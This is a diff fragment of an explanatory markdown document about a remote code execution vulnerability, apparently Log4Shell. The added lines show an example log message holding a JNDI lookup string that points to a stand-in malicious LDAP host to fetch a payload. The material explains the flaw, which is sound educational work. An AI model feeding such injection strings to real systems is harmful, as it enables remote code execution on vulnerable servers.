@@ -12,3 +12,5 @@
 - It allowed **Remote Code Execution** - the most dangerous kind of vulnerability.
 - Imagine an application writing down a log message like:
 ```bash
+User: ${jndi:ldap://malicious-server.com/payload}
+```
